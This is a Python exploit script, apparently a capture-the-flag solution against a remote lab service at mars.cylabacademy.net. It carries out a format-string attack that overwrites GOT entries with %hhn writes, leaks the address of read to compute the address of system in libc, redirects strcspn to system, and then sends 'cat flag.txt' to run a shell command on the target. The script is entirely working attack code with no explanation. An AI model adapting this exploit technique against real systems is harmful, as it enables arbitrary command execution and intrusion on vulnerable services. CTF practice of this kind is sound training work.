import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
PRINTF_GOT = 0x601030
STRCSPN_GOT = 0x601048
READ_GOT = 0x601050
B_READ = 0x4008e8
READ_OFF = 0x111130
SYSTEM_OFF = 0x52290


def buildB(fmt_body, addrs):
    b = b"1" + fmt_body
    pad = (8 - (len(b) % 8)) % 8
    b += b"P" * pad
    off = len(b)
    for ad in addrs:
        b += struct.pack("<Q", ad)
    pos = [42 + (off // 8) + i for i in range(len(addrs))]
    return b, pos


def make_fmt(dst, value, leak_addr=None, c0=30, nbytes=6):
    vals = [((value >> (8 * i)) & 0xFF, i) for i in range(nbytes)]
    order = sorted(vals)
    addrs = [dst + off for v, off in order]
    if leak_addr is not None:
        addrs.append(leak_addr)
    pos = [42 + i for i in range(len(addrs))]
    for _ in range(10):
        fmt = b""
        cur = c0
        for i, (v, off) in enumerate(order):
            need = (v - cur) % 256
            if need == 0:
                need = 256
            cur += need
            fmt += b"%" + str(need).encode() + b"c%" + str(pos[i]).encode() + b"$hhn"
        if leak_addr is not None:
            fmt += b"%" + str(pos[len(order)]).encode() + b"$s"
        b, newpos = buildB(fmt, addrs)
        if newpos == pos:
            return b, newpos
        pos = newpos
    return b, pos


def recv_all(s, t=1.2):
    time.sleep(t)
    out = b""
    try:
        while True:
            c = s.recv(1 << 16)
            if not c:
                break
            out += c
    except Exception:
        pass
    return out


s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(8)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
b1, p1 = make_fmt(PRINTF_GOT, B_READ, leak_addr=READ_GOT, c0=30)
print("B1 pos:", p1)
s.sendall(b"-1\n"); time.sleep(0.2)
s.sendall(b1 + b"\n")
o1 = recv_all(s, 1.2)
print("passe1:", len(o1), "| Found:", o1.count(b"Found the answer"), "| PPPP:", o1.count(b"PPPP"))
j = o1.find(b"PPPP")
read_addr = int.from_bytes(o1[j - 6:j] + b"\x00\x00", "little")
base = read_addr - READ_OFF
system = base + SYSTEM_OFF
print("system:", hex(system))
b2, p2 = make_fmt(STRCSPN_GOT, system, None, c0=30)
print("B2 pos:", p2, "B2:", b2[:90])
s.sendall(b2 + b"\n")
o2 = recv_all(s, 1.2)
print("passe2:", len(o2), "| Found:", o2.count(b"Found the answer"), "| extrait:", repr(o2[:200]))
s.sendall(b"cat flag.txt\n")
o3 = recv_all(s, 1.5)
print("passe3:", len(o3), "| extrait:", repr(o3[:300]))
s.close()
